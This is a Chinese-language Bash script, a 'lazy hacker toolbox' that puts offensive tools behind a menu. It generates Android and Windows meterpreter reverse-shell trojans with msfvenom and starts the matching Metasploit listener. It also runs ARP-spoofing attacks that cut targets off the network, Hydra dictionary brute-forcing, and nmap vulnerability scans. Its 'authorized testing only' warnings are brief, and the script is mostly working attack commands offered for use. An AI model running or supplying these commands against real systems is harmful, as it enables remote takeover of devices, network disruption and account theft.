# =============================================
# Scan - 懒人式黑客工具箱（优化版）
# 作者: huocai250
# 版本: 1.2.0
# =============================================

# ==================== 颜色定义 ====================
NO_COLOR="\e[0m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
YELLOW="\e[1;33m"

# ==================== 配置 ====================
LOGFILE="scan.log"
TEMP_RC="temp.rc"

# ==================== 日志函数 ====================
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
}

# ==================== 检查依赖 ====================
check_dependencies() {
    echo -e "${YELLOW}正在检查依赖工具...${NO_COLOR}"
    local deps=(nmap msfconsole whois dig hydra curl)
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}警告: $dep 未安装，部分功能可能不可用${NO_COLOR}"
        fi
    done
    echo -e "${GREEN}依赖检查完成${NO_COLOR}"
}

# ==================== 主菜单 ====================
console() {
    clear
    echo -e "${BOLD_RED}"
    cat << "EOF"
    /\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$
     /\$$__  \$$
     | \$$  \__/  /\$$$$$$$$  /\$$$$$$  /\$$$$$$$
     |  \$$$$  /\$$_____/ |____  \$$| \$$__  \$$
      \____  \$$| \$$        /\$$$$$$$| \$$  | \$$
     /\$$  \ \$$| \$$       /\$$__  \$$| \$$  | \$$
    |  \$$$$$$/|  \$$$$$$$|  \$$$$$$| \$$  | \$$
     \______/  \_______/ \_______/|__/  |__/
EOF
    echo -e "${BOLD_BLUE}          懒人式黑客工具箱 v1.2.0${NO_COLOR}"
    echo -e "${CYAN}          https://github.com/huocai250/Scan${NO_COLOR}\n"

    echo -e "${BOLD_BLUE}================== 主菜单 ==================${NO_COLOR}"
    echo -e "  ${GREEN}1.${NO_COLOR}  Nmap 高级扫描"
    echo -e "  ${GREEN}2.${NO_COLOR}  生成木马（MSF）"
    echo -e "  ${GREEN}3.${NO_COLOR}  启动监听"
    echo -e "  ${GREEN}4.${NO_COLOR}  局域网断网攻击（ARP）"
    echo -e "  ${GREEN}5.${NO_COLOR}  Whois 查询"
    echo -e "  ${GREEN}6.${NO_COLOR}  DNS 枚举"
    echo -e "  ${GREEN}7.${NO_COLOR}  密码破解工具"
    echo -e "  ${GREEN}8.${NO_COLOR}  使用帮助"
    echo -e "  ${GREEN}9.${NO_COLOR}  查看操作日志"
    echo -e "  ${GREEN}10.${NO_COLOR} 退出程序"
    echo -e "${BOLD_BLUE}===========================================${NO_COLOR}\n"

    echo -e "${GREEN}请输入序号进行选择：${NO_COLOR}"
    read -r number

    case $number in
        1) nmapscan_menu ;;
        2) msfmuma_menu ;;
        3) jianting_menu ;;
        4) dw_menu ;;
        5) whois_menu ;;
        6) dns_menu ;;
        7) crack_menu ;;
        8) show_help ;;
        9) show_logs ;;
        10) echo -e "${GREEN}感谢使用 Scan 工具箱，再见！${NO_COLOR}"; exit 0 ;;
        *) echo -e "${RED}输入错误，请重新选择！${NO_COLOR}"; sleep 1; console ;;
    esac
}

# ==================== Nmap 扫描 ====================
nmapscan_menu() {
    echo -e "${GREEN}请输入目标 IP 或网段（如 192.168.1.1 或 192.168.1.0/24）：${NO_COLOR}"
    read -r nmapip
    [[ -z "$nmapip" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${BOLD_GREEN}正在进行 Nmap 扫描...${NO_COLOR}"
    log_message "Nmap扫描目标: $nmapip"
    sudo nmap -sT -sV -O -A --script=vuln "$nmapip" | tee -a "$LOGFILE"
    echo -e "${GREEN}扫描完成！${NO_COLOR}"
    back_to_menu
}

# ==================== MSF 木马生成 ====================
msfmuma_menu() {
    echo -e "${GREEN}请输入你的本地 IP（LHOST）：${NO_COLOR}"
    read -r msflhost
    [[ -z "$msflhost" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${GREEN}请输入监听端口（LPORT，默认 4444）：${NO_COLOR}"
    read -r msflport
    [[ -z "$msflport" ]] && msflport=4444

    echo -e "${BLUE}请选择木马类型：\n1. Android\n2. Windows${NO_COLOR}"
    read -r muma

    if [ "$muma" = "1" ]; then
        echo -e "${BOLD_RED}正在生成 Android 木马...${NO_COLOR}"
        log_message "生成 Android 木马 LHOST=$msflhost LPORT=$msflport"
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$msflhost" LPORT="$msflport" -o android.apk
    elif [ "$muma" = "2" ]; then
        echo -e "${BOLD_RED}正在生成 Windows 木马...${NO_COLOR}"
        log_message "生成 Windows 木马 LHOST=$msflhost LPORT=$msflport"
        sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$msflhost" LPORT="$msflport" -f exe -o windows.exe
    else
        echo -e "${RED}选择错误！${NO_COLOR}"
        msfmuma_menu
        return
    fi
    echo -e "${GREEN}木马生成完成！${NO_COLOR}"
    back_to_menu
}

# ==================== 监听功能 ====================
jianting_menu() {
    echo -e "${GREEN}请输入监听 IP（LHOST）：${NO_COLOR}"
    read -r jtip
    [[ -z "$jtip" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${GREEN}请输入监听端口（默认 4444）：${NO_COLOR}"
    read -r jtport
    [[ -z "$jtport" ]] && jtport=4444

    echo -e "${BLUE}请选择木马类型：\n1. Android\n2. Windows${NO_COLOR}"
    read -r jtmuma

    echo -e "${BOLD_RED}正在启动 Meterpreter 监听...${NO_COLOR}"
    log_message "启动监听: $jtip:$jtport 类型:$jtmuma"

    if [ "$jtmuma" = "1" ]; then
        payload="android/meterpreter/reverse_tcp"
    else
        payload="windows/meterpreter/reverse_tcp"
    fi

    cat > "$TEMP_RC" << EOF
use exploit/multi/handler
set payload $payload
set LHOST $jtip
set LPORT $jtport
exploit
EOF

    msfconsole -q -r "$TEMP_RC"
    rm -f "$TEMP_RC"
    back_to_menu
}

# ==================== 断网攻击 ====================
dw_menu() {
    echo -e "${YELLOW}警告：此功能仅限局域网授权测试使用！${NO_COLOR}"
    echo -e "${GREEN}请输入目标 IP：${NO_COLOR}"
    read -r dwhost
    [[ -z "$dwhost" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${GREEN}请输入网关 IP：${NO_COLOR}"
    read -r dwwg
    [[ -z "$dwwg" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }

    echo -e "${BOLD_RED}正在发起 ARP 断网攻击（Ctrl+C 停止）...${NO_COLOR}"
    log_message "ARP断网攻击 目标:$dwhost 网关:$dwwg"
    sudo arpspoof -i eth0 -t "$dwhost" "$dwwg" 2>/dev/null || sudo arpspoof -i wlan0 -t "$dwhost" "$dwwg"
    back_to_menu
}

# ==================== Whois & DNS ====================
whois_menu() {
    echo -e "${GREEN}请输入域名或 IP：${NO_COLOR}"
    read -r target
    [[ -z "$target" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${BOLD_GREEN}正在查询 Whois 信息...${NO_COLOR}"
    log_message "Whois 查询: $target"
    whois "$target" | tee -a "$LOGFILE"
    back_to_menu
}

dns_menu() {
    echo -e "${GREEN}请输入域名：${NO_COLOR}"
    read -r target
    [[ -z "$target" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; console; }
    
    echo -e "${BOLD_GREEN}正在进行 DNS 枚举...${NO_COLOR}"
    log_message "DNS 枚举: $target"
    dig "$target" ANY | tee -a "$LOGFILE"
    back_to_menu
}

# ==================== 密码破解 ====================
crack_menu() {
    echo -e "${BLUE}密码破解工具\n1. MD5 哈希破解\n2. 字典爆破 (Hydra)\n3. 返回主菜单${NO_COLOR}"
    read -r choice
    case $choice in
        1) md5_crack ;;
        2) dict_crack ;;
        3) console ;;
        *) echo -e "${RED}选择错误！${NO_COLOR}"; crack_menu ;;
    esac
}

md5_crack() {
    echo -e "${GREEN}请输入 MD5 哈希值：${NO_COLOR}"
    read -r hash
    [[ -z "$hash" ]] && { echo -e "${RED}输入不能为空！${NO_COLOR}"; crack_menu; }
    
    echo -e "${BOLD_GREEN}正在尝试破解 MD5（在线查询）...${NO_COLOR}"
    log_message "MD5 破解: $hash"
    
    # 在线查询
    echo -e "${YELLOW}建议访问以下链接查看结果：${NO_COLOR}"
    echo "https://md5.gromweb.com/?md5=$hash"
    echo "https://www.onlinehashcrack.com/"
    back_to_menu
}

dict_crack() {
    echo -e "${GREEN}请输入目标 URL 或 IP:端口（如 http://target.com 或 ssh://192.168.1.1）${NO_COLOR}"
    read -r target
    echo -e "${GREEN}请输入字典文件路径（默认 /usr/share/wordlists/rockyou.txt）：${NO_COLOR}"
    read -r dict
    [[ -z "$dict" ]] && dict="/usr/share/wordlists/rockyou.txt"
    
    if [ ! -f "$dict" ]; then
        echo -e "${RED}字典文件不存在！${NO_COLOR}"
        crack_menu
    fi
    
    echo -e "${BOLD_GREEN}正在使用 Hydra 进行字典爆破...${NO_COLOR}"
    log_message "Hydra 爆破: $target 字典:$dict"
    hydra -L /usr/share/wordlists/users.lst -P "$dict" -t 4 "$target" http-get
    back_to_menu
}

# ==================== 帮助和日志 ====================
show_help() {
    echo -e "${BOLD_CYAN}"
    cat << "EOF"
================== 使用帮助 ==================

1. Nmap扫描       → 端口、服务、OS、漏洞扫描
2. 生成木马       → MSF 一键生成 Android/Windows 木马
3. 启动监听       → Meterpreter 监听
4. 断网攻击       → 局域网 ARP 欺骗（需 root）
5. Whois查询      → 域名/IP 注册信息
6. DNS枚举        → 域名记录查询
7. 密码破解       → MD5 在线破解 + Hydra 字典爆破

注意事项：
- 大部分功能需要 root 权限（sudo）
- 请仅在授权测试环境中使用
- 所有操作均记录在 scan.log
- Termux 用户部分功能需额外配置

GitHub: https://github.com/huocai250/Scan
EOF
    echo -e "${NO_COLOR}"
    back_to_menu
}

show_logs() {
    echo -e "${BOLD_CYAN}================== 操作日志 ==================${NO_COLOR}"
    if [ -f "$LOGFILE" ]; then
        cat "$LOGFILE"
    else
        echo -e "${YELLOW}暂无日志记录${NO_COLOR}"
    fi
    back_to_menu
}

back_to_menu() {
    echo -e "\n${GREEN}按 Enter 键返回主菜单...${NO_COLOR}"
    read -r
    console
}

# ==================== 主程序入口 ====================
echo -e "${BOLD_GREEN}Scan 工具箱启动中...${NO_COLOR}"
check_dependencies
log_message "Scan 工具箱启动"
console
